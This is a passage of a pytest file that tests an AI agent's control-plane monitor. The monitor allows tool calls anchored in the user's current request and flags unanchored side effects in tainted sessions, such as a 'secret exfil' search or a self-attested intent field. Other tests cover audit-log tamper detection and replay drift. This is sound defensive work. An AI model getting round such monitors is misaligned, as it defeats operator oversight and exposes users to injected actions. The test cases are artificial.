    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_allows_current_turn_anchored_shell_exec_on_tainted_context() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="shell.exec",
        arguments={"command": ["echo", "Hello Ledger!"], "command_intent": "execute"},
        origin=_origin("s-action-monitor-anchor-shell"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": 'echo "Hello Ledger!"',
                "action_arguments": {
                    "command": ["echo", "Hello Ledger!"],
                    "command_intent": "execute",
                },
            },
        )
    )

    assert action.action_kind == ActionKind.SHELL_EXEC
    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_allows_current_turn_anchored_reminder_on_tainted_context() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="reminder.create",
        arguments={
            "message": "timer done",
            "when": "in 1 minute",
            "reminder_intent": "current_turn_reminder_create",
        },
        origin=_origin("s-action-monitor-cli-set-reminder"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": 'remind me to say "timer done" in 1 minute',
                "action_arguments": {
                    "message": "timer done",
                    "when": "in 1 minute",
                    "reminder_intent": "current_turn_reminder_create",
                },
            },
        )
    )

    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_allows_current_turn_anchored_clock_time_reminder() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="reminder.create",
        arguments={
            "message": "timer done",
            "when": "at 3pm",
            "reminder_intent": "current_turn_reminder_create",
        },
        origin=_origin("s-action-monitor-cli-set-reminder-clock"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": 'remind me to say "timer done" at 3pm',
                "action_arguments": {
                    "message": "timer done",
                    "when": "at 3pm",
                    "reminder_intent": "current_turn_reminder_create",
                },
            },
        )
    )

    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_keeps_comma_inside_current_turn_anchored_value() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="reminder.create",
        arguments={
            "message": "timer done, check oven",
            "when": "at 3pm",
            "reminder_intent": "current_turn_reminder_create",
        },
        origin=_origin("s-action-monitor-cli-set-reminder-comma"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": ('please set a reminder at 3pm to say "timer done, check oven"'),
                "action_arguments": {
                    "message": "timer done, check oven",
                    "when": "at 3pm",
                    "reminder_intent": "current_turn_reminder_create",
                },
            },
        )
    )

    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_keeps_command_words_inside_current_turn_anchored_value() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="reminder.create",
        arguments={
            "message": "check the service and set DEBUG=1",
            "when": "in 1 minute",
            "reminder_intent": "current_turn_reminder_create",
        },
        origin=_origin("s-action-monitor-cli-set-content"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": (
                    "can you set a reminder in 1 minute to say check the service and set DEBUG=1"
                ),
                "action_arguments": {
                    "message": "check the service and set DEBUG=1",
                    "when": "in 1 minute",
                    "reminder_intent": "current_turn_reminder_create",
                },
            },
        )
    )

    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_gh51_trace_voter_allows_typed_current_turn_filesystem_read_intent() -> None:
    action = build_action(
        tool_name="fs.list",
        arguments={"path": "docs", "filesystem_intent": "current_turn_local_read"},
        origin=_origin("s-gh51-typed-fs-intent"),
    )

    decision = await TraceVoter().cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(
                allowed=False,
                reason_code="trace:tdg_confirmation_required",
                risk_tier=RiskTier.MEDIUM,
            ),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "filesystem_intent": "current_turn_local_read",
                "action_arguments": {
                    "path": "docs",
                    "filesystem_intent": "current_turn_local_read",
                },
            },
        )
    )

    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "trace:current_turn_local_filesystem_read_intent" in decision.reason_codes


@pytest.mark.asyncio
async def test_gh51_engine_honors_typed_current_turn_filesystem_read_trace_allowance(
    tmp_path: Path,
) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / "cp-gh51-typed-fs-intent",
        workspace_roots=[tmp_path],
    )
    origin = _origin("s-gh51-engine-typed-fs-intent")
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="list the files in the docs folder",
        origin=origin,
        ttl_seconds=1800,
        max_actions=10,
        capabilities={Capability.FILE_READ},
    )

    evaluation = await engine.evaluate_action(
        tool_name="fs.read",
        arguments={
            "path": "docs/open-claw-use-cases.md",
            "max_bytes": 4096,
            "filesystem_intent": "current_turn_local_read",
        },
        origin=origin,
        risk_tier=RiskTier.LOW,
        declared_domains=[],
        session_tainted=True,
        trusted_input=True,
        operator_owned_cli_input=True,
    )

    assert evaluation.trace_result.allowed is False
    assert evaluation.trace_result.reason_code == "trace:tdg_confirmation_required"
    assert evaluation.decision == ControlDecision.ALLOW
    assert "trace:tdg_confirmation_required" not in evaluation.reason_codes
    trace_votes = [
        vote for vote in evaluation.consensus.votes if vote.voter == "ExecutionTraceVerifier"
    ]
    assert trace_votes
    assert "trace:current_turn_local_filesystem_read_intent" in trace_votes[0].reason_codes


@pytest.mark.asyncio
async def test_action_monitor_allows_current_turn_anchored_memory_write() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="todo.complete",
        arguments={"selector": "review PRs"},
        origin=_origin("s-action-monitor-anchor-memory-write"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "mark the review PRs todo complete",
                "action_arguments": {"selector": "review PRs"},
            },
        )
    )
    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_flags_tainted_side_effect_when_values_are_not_anchored() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "secret exfil"},
        origin=_origin("s-action-monitor-anchor-mismatch"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "summarize this document",
                "action_arguments": {"query": "secret exfil"},
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes
    assert "action_monitor:current_turn_anchored" not in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_flags_generated_current_turn_values() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="todo.create",
        arguments={"title": "review PRs urgently"},
        origin=_origin("s-action-monitor-generated-value"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "create a todo called review PRs",
                "action_arguments": {"title": "review PRs urgently"},
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes
    assert "action_monitor:current_turn_anchored" not in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_flags_when_effect_shaping_field_was_stripped() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="fs.write",
        arguments={"path": "status.txt", "content": "ok"},
        origin=_origin("s-action-monitor-stripped-content"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "write ok to status.txt",
                "action_arguments": {"path": "status.txt"},
                "action_argument_omitted_fields": ["content"],
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes
    assert "action_monitor:current_turn_anchored" not in decision.reason_codes


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "raw_user_text",
    [
        "add todo: review PRs; list my todos",
        "add todo: review PRs, list my todos",
        "add todo: review PRs; read README.md",
        "add todo: review PRs, read README.md",
    ],
)
async def test_action_monitor_allows_explicit_todo_create_with_follow_on_commands(
    raw_user_text: str,
) -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="todo.create",
        arguments={"title": "review PRs"},
        origin=_origin("s-action-monitor-follow-on-punctuation"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": raw_user_text,
                "action_arguments": {"title": "review PRs"},
            },
        )
    )
    assert decision.decision == VoteKind.ALLOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_allows_current_turn_anchored_todo_create_in_multi_tool_turn() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="todo.create",
        arguments={"title": "scan-complete"},
        origin=_origin("s-action-monitor-multi-tool-todo-create"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "list the files in /root and create a todo called scan-complete",
                "action_arguments": {"title": "scan-complete"},
            },
        )
    )
    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_flags_primary_field_mismatch() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="note.create",
        arguments={"key": "note:groceries"},
        origin=_origin("s-action-monitor-note-primary-fields"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "add a note: groceries",
                "action_arguments": {"key": "note:groceries"},
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert "action_monitor:current_turn_anchored" not in decision.reason_codes


@pytest.mark.asyncio
async def test_action_monitor_flags_redacted_note_create_without_source_value() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="note.create",
        arguments={"key": "note:groceries"},
        origin=_origin("s-action-monitor-redacted-note"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "remember that groceries",
                "action_arguments": {"key": "note:groceries"},
                "action_argument_omitted_fields": ["content"],
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rr2_action_monitor_allows_at_iso_reminder_datetime() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="reminder.create",
        arguments={"message": "check email", "when": "at 2026-03-30T12:00:00Z"},
        origin=_origin("s-action-monitor-reminder-at-iso"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "remind me to check email at 2026-03-30T12:00:00Z",
                "action_arguments": {
                    "message": "check email",
                    "when": "at 2026-03-30T12:00:00Z",
                },
            },
        )
    )
    assert decision.decision == VoteKind.ALLOW
    assert "action_monitor:current_turn_anchored" in decision.reason_codes


@pytest.mark.asyncio
async def test_gh49_action_monitor_does_not_allow_self_attested_reminder_intent() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="reminder.create",
        arguments={
            "message": "timer done",
            "when": "in 1 minute",
            "reminder_intent": "current_turn_reminder_create",
        },
        origin=_origin("s-gh49-reminder-typed-intent"),
    )

    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "action_arguments": {
                    "message": "timer done",
                    "when": "in 1 minute",
                    "reminder_intent": "current_turn_reminder_create",
                },
            },
        )
    )

    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rlc7_action_monitor_voter_flags_untrusted_clean_side_effect() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-untrusted-clean"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": False,
                "trusted_input": False,
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:untrusted_input_side_effect" in decision.reason_codes


@pytest.mark.asyncio
async def test_u5_action_monitor_allows_clean_operator_cli_side_effect() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="fs.write",
        arguments={"path": "test-output.txt", "content": "hello"},
        origin=_origin("s-action-monitor-trusted-cli"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": False,
                "trusted_input": False,
                "operator_owned_cli_input": True,
            },
        )
    )

    assert decision.decision == VoteKind.ALLOW
    assert decision.risk_tier == RiskTier.LOW
    assert "action_monitor:clean_operator_cli_intent" in decision.reason_codes


@pytest.mark.asyncio
async def test_u5_action_monitor_still_flags_tainted_operator_cli_side_effect() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="fs.write",
        arguments={"path": "test-output.txt", "content": "hello"},
        origin=_origin("s-action-monitor-trusted-cli-tainted"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": False,
                "operator_owned_cli_input": True,
            },
        )
    )

    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rlc7_action_monitor_voter_flags_tainted_untrusted_side_effect() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-untrusted-tainted"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": True,
                "trusted_input": False,
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rr2_action_monitor_voter_missing_metadata_fails_closed() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-missing-metadata"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={},
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rr2_action_monitor_voter_string_metadata_fails_closed() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-string-metadata"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": "false",
                "trusted_input": "true",
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:side_effect_on_tainted_session" in decision.reason_codes


@pytest.mark.asyncio
async def test_m1_rr2_action_monitor_voter_string_false_trusted_input_fails_closed() -> None:
    voter = ActionMonitorVoter()
    action = build_action(
        tool_name="web.search",
        arguments={"query": "latest news"},
        origin=_origin("s-action-monitor-string-false"),
    )
    decision = await voter.cast_vote(
        ConsensusInput(
            action=action,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            metadata_payload={
                "session_tainted": False,
                "trusted_input": "false",
            },
        )
    )
    assert decision.decision == VoteKind.FLAG
    assert decision.risk_tier == RiskTier.HIGH
    assert "action_monitor:untrusted_input_side_effect" in decision.reason_codes


def test_m5_rt4_contains_freeform_text_blocks_large_single_line_values() -> None:
    assert contains_freeform_text({"note": "a" * 257}) is True
    assert contains_freeform_text({"note": "a" * 256}) is False


def test_m5_rt5_extract_request_size_is_metadata_only() -> None:
    assert extract_request_size_bytes({"request_body": "x" * 4096}) == 0
    assert (
        extract_request_size_bytes(
            {"request_body": "x" * 4096, "request_headers": {"Content-Length": "42"}}
        )
        == 42
    )


def test_m5_rt6_baseline_known_hosts_handles_colons_in_origin_fields() -> None:
    baseline = BaselineDatabase()
    origin = Origin(
        session_id="s-rt6",
        user_id="user:alpha",
        workspace_id="ws:beta",
        skill_name="skill:gamma",
        actor="planner",
    )
    metadata = extract_network_metadata(
        origin=origin,
        tool_name="http_request",
        destination_host="api.good.example",
        destination_port=443,
        protocol="https",
        request_size=128,
    )
    baseline.record(
        metadata=metadata,
        allow_or_confirmed=True,
        suspicious=False,
        lockdown=False,
    )
    assert baseline.known_hosts_for_origin(origin) == {"api.good.example"}


def test_m5_rt7_control_plane_audit_chain_detects_whitespace_tamper(tmp_path) -> None:
    path = tmp_path / "control-plane-audit.jsonl"
    log = ControlPlaneAuditLog(path)
    log.append(event_type="e1", session_id="s", actor="a", data={"k": "v1"})
    log.append(event_type="e2", session_id="s", actor="a", data={"k": "v2"})
    ok_before, _, _ = log.verify_chain()
    assert ok_before is True

    lines = path.read_text(encoding="utf-8").splitlines()
    lines[0] = lines[0] + "  "
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    ok_after, _, error = log.verify_chain()
    assert ok_after is False
    assert "chain break" in error


def test_m5_rt8_history_load_logs_malformed_records(
    tmp_path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    history_path = tmp_path / "history.jsonl"
    history_path.write_text("{not-json}\n", encoding="utf-8")
    caplog.set_level("WARNING", logger="shisad.security.control_plane.history")
    history = SessionActionHistoryStore(history_path)
    assert history.state_load_result.status == StateLoadStatus.CORRUPT
    assert "retained malformed record" in caplog.text


def test_m5_rt11_sequence_analyzer_dedupes_preflight_and_execution_rows() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-seq-dedupe")
    now = datetime.now(UTC)
    for index in range(2):
        action = ControlPlaneAction(
            timestamp=now + timedelta(seconds=index),
            origin=origin,
            tool_name="file.read",
            action_kind=ActionKind.FS_LIST,
            resource_id=f"/tmp/{index}",
        )
        history.append_action(action, decision_status="allow")
        history.append_action(action, decision_status="allow", execution_status="success")

    candidate = ControlPlaneAction(
        timestamp=now + timedelta(seconds=3),
        origin=origin,
        tool_name="file.read",
        action_kind=ActionKind.FS_LIST,
        resource_id="/tmp/2",
    )
    findings = analyzer.analyze(history=history, candidate_action=candidate, now=now)
    assert all(item.pattern_name != "mass_enum" for item in findings)


def test_recovery_execution_idempotency_key_survives_history_restart(
    tmp_path: Path,
) -> None:
    history_path = tmp_path / "history.jsonl"
    action = ControlPlaneAction(
        origin=_origin("s-recovery-idempotency"),
        tool_name="time.now",
        action_kind=ActionKind.RUNTIME_READ,
    )
    first = SessionActionHistoryStore(history_path)
    first.append_action(
        action,
        decision_status="allow",
        execution_status="success",
        idempotency_key="recovery:confirmation-1:attempt-1",
    )

    restarted = SessionActionHistoryStore(history_path)
    restarted.append_action(
        action,
        decision_status="allow",
        execution_status="success",
        idempotency_key="recovery:confirmation-1:attempt-1",
    )

    assert len(restarted.all_for_session("s-recovery-idempotency")) == 1
    assert len(history_path.read_text(encoding="utf-8").splitlines()) == 1


@pytest.mark.parametrize("execution_recorded", [False, True])
def test_f2_correlated_stage2_replay_and_restart_containment(
    tmp_path: Path,
    execution_recorded: bool,
) -> None:
    data_dir = tmp_path / "correlated-stage2"
    engine = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    origin = _origin("s-correlated-stage2")
    previous_hash = engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="read then send",
        origin=origin,
        ttl_seconds=300,
        max_actions=3,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="message.send",
        arguments={"recipient": "alice", "content": "done"},
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
        workspace_roots=[tmp_path],
    )

    amended_hash = engine.approve_stage2(
        action=action,
        approved_by="human_confirmation",
        correlation_id="confirmation-1:attempt-1",
        expected_previous_hash=previous_hash,
        execution_idempotency_key="execution:attempt-1:control-plane",
    )
    replayed_hash = engine.approve_stage2(
        action=action,
        approved_by="human_confirmation",
        correlation_id="confirmation-1:attempt-1",
        expected_previous_hash=previous_hash,
        execution_idempotency_key="execution:attempt-1:control-plane",
    )

    assert replayed_hash == amended_hash
    with pytest.raises(ValueError, match="execution-key mismatch"):
        engine.approve_stage2(
            action=action,
            approved_by="human_confirmation",
            correlation_id="confirmation-1:attempt-1",
            expected_previous_hash=previous_hash,
        )
    if execution_recorded:
        engine.record_execution(
            action=action,
            success=True,
            idempotency_key="execution:attempt-1:control-plane",
        )
    restarted = ControlPlaneEngine.build(
        data_dir=data_dir,
        workspace_roots=[tmp_path],
    )
    assert restarted.active_plan_hash(origin.session_id) == (
        amended_hash if execution_recorded else ""
    )


def test_f2_execution_attempt_key_deduplicates_normal_and_recovery_accounting(
    tmp_path: Path,
) -> None:
    data_dir = tmp_path / "attempt-accounting"
    engine = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    origin = _origin("s-attempt-accounting")
    engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="read one file",
        origin=origin,
        ttl_seconds=300,
        max_actions=3,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="file.read",
        arguments={"path": str(tmp_path / "source.txt")},
        origin=origin,
        risk_tier=RiskTier.LOW,
        workspace_roots=[tmp_path],
    )
    recovery_action = action.model_copy(
        update={"origin": origin.model_copy(update={"actor": "recovery"})}
    )
    execution_key = "execution:attempt-1:control-plane"

    engine.record_execution(
        action=action,
        success=True,
        idempotency_key=execution_key,
    )
    engine.record_execution(
        action=recovery_action,
        success=True,
        idempotency_key=execution_key,
    )

    rows = [
        json.loads(line)
        for line in (data_dir / "control_plane" / "history.jsonl")
        .read_text(encoding="utf-8")
        .splitlines()
        if line.strip()
    ]
    execution_rows = [row for row in rows if row.get("execution_status")]
    assert len(execution_rows) == 1
    plans_envelope = json.loads(
        (data_dir / "control_plane" / "plans.json").read_text(encoding="utf-8")
    )
    plans = plans_envelope["payload"]
    assert plans[origin.session_id]["executed_actions"] == 1


@pytest.mark.parametrize(
    "drift",
    ["resource_ids", "network_hosts", "risk_tier", "origin_identity"],
)
def test_f2_execution_attempt_key_rejects_stable_action_surface_drift(
    tmp_path: Path,
    drift: str,
) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / f"attempt-drift-{drift}",
        workspace_roots=[tmp_path],
    )
    origin = _origin("s-attempt-drift")
    action = build_action(
        tool_name="file.read",
        arguments={"path": str(tmp_path / "source.txt")},
        origin=origin,
        risk_tier=RiskTier.LOW,
        workspace_roots=[tmp_path],
    )
    if drift == "resource_ids":
        replay = action.model_copy(
            update={"resource_ids": [*action.resource_ids, str(tmp_path / "forged.txt")]}
        )
    elif drift == "network_hosts":
        replay = action.model_copy(update={"network_hosts": ["forged.example"]})
    elif drift == "risk_tier":
        replay = action.model_copy(update={"risk_tier": RiskTier.HIGH})
    else:
        replay = action.model_copy(
            update={"origin": origin.model_copy(update={"user_id": "mallory"})}
        )
    execution_key = "execution:attempt-drift:control-plane"
    engine.record_execution(
        action=action,
        success=True,
        idempotency_key=execution_key,
    )

    with pytest.raises(ValueError, match="control_plane_execution_idempotency_conflict"):
        engine.record_execution(
            action=replay,
            success=True,
            idempotency_key=execution_key,
        )


def test_f2_legacy_execution_record_without_surface_hash_still_deduplicates(
    tmp_path: Path,
) -> None:
    data_dir = tmp_path / "legacy-attempt-surface"
    engine = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    origin = _origin("s-legacy-attempt-surface")
    action = build_action(
        tool_name="file.read",
        arguments={"path": str(tmp_path / "source.txt")},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    execution_key = "execution:legacy-attempt:control-plane"
    engine.record_execution(action=action, success=True, idempotency_key=execution_key)
    history_path = data_dir / "control_plane" / "history.jsonl"
    rows = [json.loads(line) for line in history_path.read_text(encoding="utf-8").splitlines()]
    assert len(rows) == 1
    rows[0].pop("execution_action_surface_hash")
    history_path.write_text(
        "\n".join(json.dumps(row, sort_keys=True) for row in rows) + "\n",
        encoding="utf-8",
    )

    restarted = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    restarted.record_execution(
        action=action.model_copy(
            update={"origin": origin.model_copy(update={"actor": "recovery"})}
        ),
        success=True,
        idempotency_key=execution_key,
    )
    persisted = [json.loads(line) for line in history_path.read_text(encoding="utf-8").splitlines()]
    assert len(persisted) == 1


def test_f2_execution_status_returns_first_durable_attempt_outcome(
    tmp_path: Path,
) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / "attempt-outcome",
        workspace_roots=[tmp_path],
    )
    origin = _origin("s-attempt-outcome")
    action = build_action(
        tool_name="file.read",
        arguments={"path": str(tmp_path / "source.txt")},
        origin=origin,
        risk_tier=RiskTier.LOW,
        workspace_roots=[tmp_path],
    )
    execution_key = "execution:attempt-outcome:control-plane"

    assert engine.execution_status(idempotency_key=execution_key) == ""

    engine.record_execution(
        action=action,
        success=True,
        idempotency_key=execution_key,
    )
    engine.record_execution(
        action=action,
        success=False,
        idempotency_key=execution_key,
    )

    assert engine.execution_status(idempotency_key=execution_key) == "success"


def test_f2_unrelated_execution_does_not_reconcile_correlated_stage2_restart(
    tmp_path: Path,
) -> None:
    data_dir = tmp_path / "correlated-stage2-wrong-attempt"
    engine = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    origin = _origin("s-correlated-stage2-wrong-attempt")
    previous_hash = engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal="read then send",
        origin=origin,
        ttl_seconds=300,
        max_actions=3,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="message.send",
        arguments={"recipient": "alice", "content": "done"},
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
        workspace_roots=[tmp_path],
    )

    engine.approve_stage2(
        action=action,
        approved_by="human_confirmation",
        correlation_id="confirmation-1:attempt-1",
        expected_previous_hash=previous_hash,
        execution_idempotency_key="execution:attempt-1:control-plane",
    )
    engine.record_execution(
        action=action,
        success=True,
        idempotency_key="execution:unrelated-attempt:control-plane",
    )

    restarted = ControlPlaneEngine.build(
        data_dir=data_dir,
        workspace_roots=[tmp_path],
    )

    assert restarted.active_plan_hash(origin.session_id) == ""


